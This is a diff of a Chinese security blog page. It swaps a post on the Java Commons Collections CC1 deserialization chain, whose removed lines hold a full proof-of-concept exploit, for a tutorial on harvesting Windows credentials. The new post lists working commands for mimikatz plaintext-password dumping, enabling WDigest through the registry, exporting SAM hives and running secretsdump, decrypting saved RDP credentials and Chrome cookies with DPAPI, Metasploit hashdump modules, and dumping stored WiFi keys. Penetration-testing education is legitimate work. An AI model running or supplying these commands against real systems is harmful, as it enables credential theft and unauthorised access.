@@ -4,8 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Java反序列化-cc1链, jokerscar&#39;blogs">
-    <meta name="description" content="Commons Collections简介Apache Commons Collections是一个扩展了JAVA标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开">
+    <meta name="keywords" content="Windows下密码获取(leaning), jokerscar&#39;blogs">
+    <meta name="description" content="mimikatz简单使用mimikatz获取Windows账号明文密码mimikatz是法国的安全研究员开发的针对Windows各种环境下密码读取工具同时具有zerologon、约束委派攻击的作用，此本文主要讲mimikatz密码读取简单利">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +17,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Java反序列化-cc1链 | jokerscar&#39;blogs</title>
+    <title>Windows下密码获取(leaning) | jokerscar&#39;blogs</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -287,12 +287,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/1.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/11.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Java反序列化-cc1链</h1>
+                    <h1 class="description center-align post-title">Windows下密码获取(leaning)</h1>
                 </div>
             </div>
         </div>
@@ -408,12 +408,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/">
-                                <span class="chip bg-color">反序列化利用链</span>
-                            </a>
-                        
-                            <a href="/tags/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
-                                <span class="chip bg-color">Java代码审计</span>
+                            <a href="/tags/%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/">
+                                <span class="chip bg-color">密码获取</span>
                             </a>
                         
                     </div>
@@ -424,12 +420,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="post-category">
-                                漏洞分析
-                            </a>
-                        
-                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/" class="post-category">
-                                反序列化利用链
+                            <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="post-category">
+                                内网渗透
                             </a>
                         
                     </div>
@@ -441,7 +433,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-10-15
+                    2022-03-12
                 </div>
                 
 
@@ -462,114 +454,78 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="Commons-Collections简介"><a href="#Commons-Collections简介" class="headerlink" title="Commons Collections简介"></a>Commons Collections简介</h2><p>Apache Commons Collections是一个扩展了JAVA标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发。</p>
-<h2 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h2><p>cc链中常见的利用路线有两种，分别是TransformedMap链和LazyMap链，触发的方式基本相同，这里我们重点分析TransformedMap链。</p>
-<p><img src="/2021/10/15/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE/wps7BDA.tmp.jpg" alt="img"></p>
-<p>但不管TransformedMap利用链还是LazyMap利用链其实核心都是在调用实现了transformer接口的关键函数所构成的，在构造transformer反射利用链前可以关注一下transformer接口在源码注释中解释作用是将输入的对象转换成输出的对象。而构造利用链就需要用到实现了Transformer接口并重写了该接口中的transform函数，分别是ConstantTransformer，invokerTransformer，ChainedTransformer。</p>
-<h3 id="invokerTransformer"><a href="#invokerTransformer" class="headerlink" title="invokerTransformer"></a>invokerTransformer</h3><p>首先从invokerTransformer开始分析，以下是invokerTransformer的构造函数写transform()函数的主要内容。</p>
-<p><img src="/2021/10/15/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE/wps7BDB.tmp.jpg" alt="img"></p>
-<p>transform函数的功能简单描述一下就是通过java的反射机制调用input对象中的指定函数，函数名和参数类型分别是invokerTransformer对象实例化时传入的iMethodName和iParamTypes，利用传入的函数名和参数可控这点我们可以构造一个恶意的transform链来达成任意代码执行的效果。</p>
-<h3 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h3><p>接着再来看看ConstantTransformer类</p>
-<p><img src="/2021/10/15/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE/wps7BDC.tmp.jpg" alt="img"></p>
-<p>从上面ConstantTransformer类的构造函数可以看到，当ConstantTransformer的对象实例化时会将传入的对象赋值给成员属性iConstant，而这个属性在重写的transform函数被调用时返回。</p>
-<h3 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h3><p>还是重点来关注ChainedTransformer类中的构造函数和重写的transform函数</p>
-<p><img src="/2021/10/15/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE/wps7BDD.tmp.jpg" alt="img"></p>
-<p>我们可以看到传入进ChainedTransformer的参数是transform类型的数组，然后在ChainedTransformer对象实例化时会将传入的这个数组赋值给成员变量iTransformers在调用transform()函数时会将iTransformers数组内的每个transform对象的transform()函数调用一遍。读起来有点绕口是吗，这个反射链执行的其实是((Runtime) Runtime.class.getMethod(“getRuntime”).invoke(“null”)).exec(“calc.exe”);</p>
-<p><img src="/2021/10/15/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE/wps7BDE.tmp.jpg" alt="img"></p>
-<p>运行如图所示的demo可以看到成功的弹出了计算器，</p>
-<p>现在利用链有了，下一步要做的就是去找反序列化漏洞的触发点。目前已知java反序列化漏洞利用的核心是可序列化对象重写readObject函数并定义了一些危险的操作（例如调用Runtime类的exec执行系统命令）。而从上述的demo1中可以发现我们还需要的是在TransformedMap中可以调用到ChainedTransformer的transform函数机会。接下来的重点就是找触发transform函数和重写readObject函数的方式。</p>
-<h2 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h2><p>commons-collections组件中有两个实现了Serializable接口的类，分别是LazyMap和TransformedMap，也就是cc链中常用的两个类。</p>
-<p>TransformedMap类是Java标准数据结构Map接口的一个扩展。该类可以在一个元素被加入到集合内时，自动对该元素进行特定的修饰变换，具体的变换逻辑由Transformer类定义，Transformer在TransformedMap实例化时作为参数传入。</p>
-<p>首先从TransformedMap源码入手</p>
-<p><img src="/2021/10/15/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE/wps7BDF.tmp.jpg" alt="img"></p>
-<p>​    可以看到在TransformedMap中有三个调用到transform的函数transfomKey()、transformValue()和checkSetValue()。这三个函数都是protected属性无法在外部直接被访问，但可以看到checkSetValue的注释中有下图中这样一段话，也就是说当TransformedMap的对象作为map被调用setvalue函数时触发的实际上是checkSetValue()。因此我们后面需要做的就是想办法调用到setvalue()函数。</p>
-<p><img src="/2021/10/15/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE/wps7BE0.tmp.jpg" alt="img"></p>
-<p>另外在TransformedMap类中还有一个decorate()函数，decorate()函数会根据TransformedMap的构造函数中传入的参数返回一个TransformedMap对象。</p>
-<p><img src="/2021/10/15/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE/wps7BE1.tmp.jpg" alt="img"></p>
-<h2 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h2><p>触发transform函数的方式已经建立好了，下面需要做的是重写了readObject()函数调用到TransformedMap对象的setValue()函数，从知名反序列化工具<a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial"> <em><strong>*ysoserial*</strong></em></a>的源码中可以看到作者选择了AnnotationInvocationHandler这个类来重写readObject。</p>
-<p><img src="/2021/10/15/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE/wps7BF1.tmp.jpg" alt="img"></p>
-<p>AnnotationInvocationHandler是jdk下sun.reflect.annotation包中的一个类它实现了Serializable接口重写readObject()，其中还存在一个map属性的成员变量，在构造利用链时需要做的就是在AnnotationInvocationHandler实例化时将前面构造好的TransformedMap赋值个这个memberValues。但值得注意的是java8u71之后的版本修改了readObject不能利用。</p>
-<p><img src="/2021/10/15/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE/wps7BF2.tmp.jpg" alt="img"></p>
-<p>版本高一点的jdk在AnnotationInvocationHandler的readobject函数可读性很差且不能利用，观察jdk1.7版本中AnnotationInvocationHandler重写的readObject函数。</p>
-<p>private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {</p>
-<p>  var1.defaultReadObject();</p>
-<p>  AnnotationType var2 &#x3D; null;</p>
-<p>  try {</p>
-<p>​    var2 &#x3D; AnnotationType.getInstance(this.type);</p>
-<p>  } catch (IllegalArgumentException var9) {</p>
-<p>​    throw new InvalidObjectException(“Non-annotation type in annotation serial stream”);</p>
-<p>  }</p>
-<p>  Map var3 &#x3D; var2.memberTypes();</p>
-<p>  Iterator var4 &#x3D; this.memberValues.entrySet().iterator();</p>
-<p>  while(var4.hasNext()) {</p>
-<p>​    Entry var5 &#x3D; (Entry)var4.next();</p>
-<p>​    String var6 &#x3D; (String)var5.getKey();</p>
-<p>​    Class var7 &#x3D; (Class)var3.get(var6);</p>
-<p>​    if (var7 !&#x3D; null) {</p>
-<p>​      Object var8 &#x3D; var5.getValue();</p>
-<p>​      if (!var7.isInstance(var8) &amp;&amp; !(var8 instanceof ExceptionProxy)) {</p>
-<p>​        var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + “[“ + var8 + “]”)).setMember((Method)var2.members().get(var6)));</p>
-<p>​      }</p>
-<p>​    }</p>
-<p>  }</p>
+                <h2 id="mimikatz简单使用"><a href="#mimikatz简单使用" class="headerlink" title="mimikatz简单使用"></a><strong>mimikatz简单使用</strong></h2><h3 id="mimikatz获取Windows账号明文密码"><a href="#mimikatz获取Windows账号明文密码" class="headerlink" title="mimikatz获取Windows账号明文密码"></a>mimikatz获取Windows账号明文密码</h3><p>mimikatz是法国的安全研究员开发的针对Windows各种环境下密码读取工具同时具有zerologon、约束委派攻击的作用，此本文主要讲mimikatz密码读取简单利用，不展开对漏洞利用、免杀作出详解。</p>
+<p>mimikatz直接使用 sekurlsa::logonPasswords命令可获取低版本操作系统的明文密码，在高版本的操作系统无法直接获取明文密码</p>
+<p><img src="/2022/03/12/Windows%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96-leaning/wps6AE4.tmp.jpg" alt="img"></p>
+<p>因此需要修改注册表让Wdigest Auth保存明文口令：</p>
+<p>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f</p>
+<p><img src="/2022/03/12/Windows%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96-leaning/wps6AE5.tmp.jpg" alt="img"></p>
+<p>成功修改注册表后需要想办法让被控机再输一遍口令，关机重启或者使用以下命令、powshell脚本强制将目标机器锁屏</p>
+<p>命令：rundll32.exe user32.dll,LockWorkStation</p>
+<p>powershell：</p>
+<p>Function Lock-WorkStation {</p>
+<p>$signature &#x3D; @” [DllImport(“user32.dll”, SetLastError &#x3D; true)] public static extern bool LockWorkStation(); “@</p>
+<p>$LockWorkStation &#x3D; Add-Type -memberDefinition $signature -name “Win32LockWorkStation” -namespace Win32Functions -passthru</p>
+<p>$LockWorkStation::LockWorkStation() | Out-Null</p>
 <p>}</p>
-<p>简单解释以下就是获取AnnotationInvocationHandler实例化的对象中的成员变量memberValues对其迭代。而下面这段代码正是我们需要用到的调用setValue()。</p>
-<p><img src="/2021/10/15/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE/wps7BF3.tmp.jpg" alt="img"></p>
-<p>在源码中可以看到AnnotationInvocationHandler类的访问权限不是public，因此只能通过反射的方式获取到对象。</p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="利用链流程："><a href="#利用链流程：" class="headerlink" title="利用链流程："></a>利用链流程：</h3><p>通过Transformer[] transformers &#x3D; new Transformer[]{}构造恶意transformers数组—&gt;将Transformer数组传入transformerChain方便调用数组内的每一个transform函数—&gt;创建map，调用TransformedMap中的decorate将transformerChain传入并返回TransformedMap对象—&gt;通过反射实例化AnnotationInvocationHandler并将TransformedMap传个生成的对象调用readObject()触发checkSetValue()—&gt;序列化—&gt;反序列化触发漏洞</p>
-<h3 id="poc："><a href="#poc：" class="headerlink" title="poc："></a>poc：</h3><p>import java.io.*;</p>
-<p>import java.util.HashMap;</p>
-<p>import java.util.Map;</p>
-<p>import org.apache.commons.collections.Transformer;</p>
-<p>import org.apache.commons.collections.functors.ChainedTransformer;</p>
-<p>import org.apache.commons.collections.functors.ConstantTransformer;</p>
-<p>import org.apache.commons.collections.functors.InvokerTransformer;</p>
-<p>import java.lang.reflect.Constructor;</p>
-<p>import java.lang.annotation.Target;</p>
-<p>import org.apache.commons.collections.map.TransformedMap;</p>
-<p>public class test {</p>
-<p>  public static void main(String[] args) throws Exception{</p>
-<p>​    &#x2F;&#x2F;核心利用代码</p>
-<p>​    Transformer[] transformers &#x3D; new Transformer[]{</p>
-<p>​        new ConstantTransformer(Runtime.class),</p>
-<p>​        new InvokerTransformer(“getMethod”, new Class[]{String.class, Class[].class}, new Object[]{“getRuntime”, new Class[0]}),</p>
-<p>​        new InvokerTransformer(“invoke”, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),</p>
-<p>​        new InvokerTransformer(“exec”, new Class[]{String.class}, new Object[]{“calc.exe”})</p>
-<p>​    };</p>
-<p>​    &#x2F;&#x2F;将数组transformers传给ChainedTransformer，构造利用链</p>
-<p>​    Transformer transformerChain &#x3D; new ChainedTransformer(transformers);</p>
-<p>​    &#x2F;&#x2F;触发漏洞</p>
-<p>​    Map map &#x3D; new HashMap();</p>
-<p>​    map.put(“value”, “test”);</p>
-<p>​    &#x2F;&#x2F;通过反射触发利用链</p>
-<p>​    Map transformedMap &#x3D; TransformedMap.decorate(map, null, transformerChain);</p>
-<p>​    Class cl &#x3D; Class.forName(“sun.reflect.annotation.AnnotationInvocationHandler”);</p>
-<p>​    &#x2F;&#x2F;获得AnnotationInvocationHandler的构造器</p>
-<p>​    Constructor ctor &#x3D; cl.getDeclaredConstructor(Class.class, Map.class);</p>
-<p>​    ctor.setAccessible(true);</p>
-<p>​    &#x2F;&#x2F;将transformedMap传给AnnotationInvocationHandler的构造</p>
-<p>​    Object instance&#x3D;ctor.newInstance(Target.class, transformedMap);</p>
-<p>​    &#x2F;&#x2F;序列化</p>
-<p>​    FileOutputStream fileOutputStream &#x3D; new FileOutputStream(“serialize.ser”);</p>
-<p>​    ObjectOutputStream objectOutputStream &#x3D; new ObjectOutputStream(fileOutputStream);</p>
-<p>​    objectOutputStream.writeObject(instance);</p>
-<p>​    objectOutputStream.close();</p>
-<p>​    &#x2F;&#x2F;反序列化</p>
-<p>​    FileInputStream fileInputStream &#x3D; new FileInputStream(“serialize.ser”);</p>
-<p>​    ObjectInputStream objectInputStream &#x3D; new ObjectInputStream(fileInputStream);</p>
-<p>​    Object result &#x3D; objectInputStream.readObject();</p>
-<p>​    objectInputStream.close();</p>
-<p>  }</p>
-<p>}</p>
-<p>在jdk1.7版本下运行上述demo可观察到成功执行构造的恶意代码</p>
-<p><img src="/2021/10/15/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE/wps7BF4.tmp.jpg" alt="img"></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_35733751/article/details/118387718">https://blog.csdn.net/qq_35733751/article/details/118387718</a></p>
-<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1034/">https://paper.seebug.org/1034/</a></p>
-<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/359194253">https://zhuanlan.zhihu.com/p/359194253</a></p>
-<p><a target="_blank" rel="noopener" href="https://security.tencent.com/index.php/blog/msg/97">https://security.tencent.com/index.php/blog/msg/97</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yyhuni/p/14777166.html">https://www.cnblogs.com/yyhuni/p/14777166.html</a></p>
-<p><a target="_blank" rel="noopener" href="https://github.com/Maskhe/javasec/blob/master/3">https://github.com/Maskhe/javasec/blob/master/3</a>. apache commons-collections中的反序列化.md</p>
-<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/sraJ2K9R2CkLHiCcPK0wrA">https://mp.weixin.qq.com/s/sraJ2K9R2CkLHiCcPK0wrA</a></p>
+<p>Lock-WorkStation</p>
+<p>在目标重新输入口令后在使用mimikatz获取一次密码</p>
+<p><img src="/2022/03/12/Windows%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96-leaning/wps6AE6.tmp.jpg" alt="img"></p>
+<p>可以看到成功获取到目标的明文密码</p>
+<h3 id="mimikatz获取其他密码"><a href="#mimikatz获取其他密码" class="headerlink" title="mimikatz获取其他密码"></a>mimikatz获取其他密码</h3><p>1、获取vpn密码</p>
+<p>token::elevate lsadump::sam lsadump::secrets exit vpn</p>
+<p>2、获取IIS7配置文件密码</p>
+<p>log “iis::apphost &#x2F;in:”%systemroot%\system32\inetsrv\config\applicationHost.config” &#x2F;live”</p>
+<p>3、获取浏览器的密码和cookie信息</p>
+<p>mimikatz.exe privilege::debug log “dpapi::chrome &#x2F;in:%localappdata%\google\chrome\USERDA~1\default\cookies &#x2F;unprotect” exit</p>
+<p>mimikatz.exe privilege::debug log “dpapi::chrome &#x2F;in:%localappdata%\google\chrome\USERDA<del>1\default\USERDA</del>1” exit </p>
+<h2 id="SAM利用"><a href="#SAM利用" class="headerlink" title="SAM利用"></a><strong>SAM利用</strong></h2><h3 id="sam导出"><a href="#sam导出" class="headerlink" title="sam导出"></a>sam导出</h3><p>SAM(安全账户管理器)，SAM存放在注册表中，SAM用来存储Windows操作系统密码的数据库文件，为了避免明文密码泄露，SAM文件中保存的是明文密码经过一系列算法处理过的Hash值，被保存的Hash分为LM Hash（已废弃）和NTLMHash（长度32bit由字母数字组成），现在用户凭证是以NTLM HASH形式保存。在用户在本地或者远程登陆系统时，会将Hash值与SAM文件中保存的Hash值进行对比。在后期的Windows系统中，SAM文件中被保存的密码Hash都被密钥SYSKEY加密，接下来将对sam进行利用。</p>
+<p>通过reg命令将sam、securit、system导出</p>
+<p>reg save hklm\sam C:\sam.save</p>
+<p>reg save hklm\security C:\security.save</p>
+<p>reg save hklm\system C:\system.save</p>
+<p><img src="/2022/03/12/Windows%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96-leaning/wps6AE7.tmp.jpg" alt="img"></p>
+<h3 id="mimikatz读取hash"><a href="#mimikatz读取hash" class="headerlink" title="mimikatz读取hash"></a>mimikatz读取hash</h3><p>使用mimikataz输入以下命令</p>
+<p>lsadump::sam &#x2F;system:system.save &#x2F;sam:sam.save &#x2F;security:security.save</p>
+<p><img src="/2022/03/12/Windows%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96-leaning/wps6AE8.tmp.jpg" alt="img"></p>
+<p>可以看到成功获取到用户的hash，但没有明文密码信息，因此可以尝试还有impaket工具中的secretsdump.py，输入以下命令</p>
+<h3 id="secretsdumps读取明文密码"><a href="#secretsdumps读取明文密码" class="headerlink" title="secretsdumps读取明文密码"></a>secretsdumps读取明文密码</h3><p>secretsdumps.py -sam sam.save -security security.save -system system.save LOCAL</p>
+<p><img src="/2022/03/12/Windows%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96-leaning/wps6AE9.tmp.jpg" alt="img"></p>
+<p>可以看到成功获取到部分明文密码</p>
+<h2 id="获取本地保存的远程-RDP明文密码"><a href="#获取本地保存的远程-RDP明文密码" class="headerlink" title="获取本地保存的远程****RDP明文密码"></a><strong>获取本地保存的远程****RDP明文密码</strong></h2><p>假设当前存在一个拥有administrator权限的webshell，我们可以查看注册表找出与本地(受控服务器)连接过的机器。命令如下</p>
+<p>reg query “HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers” &#x2F;s</p>
+<p><img src="/2022/03/12/Windows%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96-leaning/wps6AEA.tmp.jpg" alt="img"></p>
+<p>可以看到这里有一个与10.x.x.50有过rdp协议通信的机器，使用cmdkey &#x2F;list命令可查看详情，使用以下命令可查阅本地是否保留rdp的密码</p>
+<p>dir &#x2F;a %userprofile%\AppData\Local\Microsoft\Credentials*</p>
+<p><img src="/2022/03/12/Windows%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96-leaning/wps6AEB.tmp.jpg" alt="img"></p>
+<p>确定目标保留了rdp密码</p>
+<p>根据上面的hash，使用mimikatz以下命令去找对应的masterkey的guid</p>
+<p>mimikatz # privilege::debug</p>
+<p>mimikatz # dpapi::cred &#x2F;in:C:\Users\Administrator\AppData\Local\Microsoft\Credentials\71BC3C1A7DBB4ABCFAD1156FF7FC6D83</p>
+<p><img src="/2022/03/12/Windows%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96-leaning/wps6AFC.tmp.jpg" alt="img"></p>
+<p>再使用mimikatz的DPAPI模块对应上面找到的guid找masterkey</p>
+<p><img src="/2022/03/12/Windows%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96-leaning/wps6AFD.tmp.jpg" alt="img"></p>
+<p>最后借助masterkey使用以下命令解密rdp密码</p>
+<p>mimikatz # dpapi::cred &#x2F;in:C:\Users\Administrator\AppData\Local\Microsoft\Credentials(文件hash) &#x2F;masterkey:(这里写masterkey)</p>
+<p><img src="/2022/03/12/Windows%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96-leaning/wps6AFE.tmp.jpg" alt="img"></p>
+<p>至此成功获取到10.xx.xx.50的密码</p>
+<h2 id="msf获取hash与密码"><a href="#msf获取hash与密码" class="headerlink" title="msf获取hash与密码"></a><strong>msf获取hash与密码</strong></h2><p>1、获取自动登录用户的密码</p>
+<p>run windows&#x2F;gather&#x2F;credentials&#x2F;windows_autologin</p>
+<p>部分用户习惯设置成自动登录，可使用上述命令获取自动登录用户的密码</p>
+<p>2、获取hash</p>
+<p>run post&#x2F;windows&#x2F;gather&#x2F;smart_hashdump </p>
+<p><img src="/2022/03/12/Windows%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96-leaning/wps6AFF.tmp.jpg" alt="img"></p>
+<p><img src="/2022/03/12/Windows%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96-leaning/wps6B00.tmp.jpg" alt="img"></p>
+<p>可以看到sandbox的密码是55555</p>
+<h2 id="获取系统保存过的-WIFI密码"><a href="#获取系统保存过的-WIFI密码" class="headerlink" title="获取系统保存过的****WIFI密码"></a><strong>获取系统保存过的****WIFI密码</strong></h2><p>使用netsh wlan show profiles命令获取连接过的WiFi名</p>
+<p><img src="/2022/03/12/Windows%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96-leaning/wps6B01.tmp.jpg" alt="img"></p>
+<p>确定WiFi，以上述Mi未列输入命令netsh wlan show profile name&#x3D;”Mi” key&#x3D;clear</p>
+<p><img src="/2022/03/12/Windows%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96-leaning/wps6B02.tmp.jpg" alt="img"></p>
+<p>可以看到成功获取到明文密码，也可以使用以下批处理脚本将所有WiFi遍历显示</p>
+<p>for &#x2F;f “skip&#x3D;9 tokens&#x3D;1,2 delims&#x3D;:” %i in (‘netsh wlan show profiles’) do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key&#x3D;clear</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/956">https://forum.butian.net/share/956</a></p>
+<p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/259">https://forum.butian.net/share/259</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/lhh134/article/details/104475654">https://blog.csdn.net/lhh134/article/details/104475654</a></p>
 
                 
             </div>
@@ -596,7 +552,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2021/10/15/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE/">http://example.com/2021/10/15/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE/</a>
+                    <a href="http://example.com/2022/03/12/Windows%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96-leaning/">http://example.com/2022/03/12/Windows%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96-leaning/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -634,12 +590,8 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/">
-                                    <span class="chip bg-color">反序列化利用链</span>
-                                </a>
-                            
-                                <a href="/tags/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
-                                    <span class="chip bg-color">Java代码审计</span>
+                                <a href="/tags/%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/">
+                                    <span class="chip bg-color">密码获取</span>
                                 </a>
                             
                         </div>
@@ -687,11 +639,62 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2021/11/06/%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0-%E4%B8%80/">
+                <a href="/2022/03/12/Windows%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96-leaning/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="Windows下密码获取(leaning)">
+                        
+                        <span class="card-title">Windows下密码获取(leaning)</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-12
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="post-category">
+                                    内网渗透
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/">
+                        <span class="chip bg-color">密码获取</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2022/03/12/%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0-%E4%B8%80/">
                     <div class="card-image">
                         
                         
@@ -707,9 +710,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-11-06
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-12
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -739,63 +742,6 @@
                     
                     <a href="/tags/%E5%86%85%E5%AD%98%E9%A9%AC/">
                         <span class="chip bg-color">内存马</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2021/07/02/Liferay-Portal%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="Liferay Portal反序列化">
-                        
-                        <span class="card-title">Liferay Portal反序列化</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
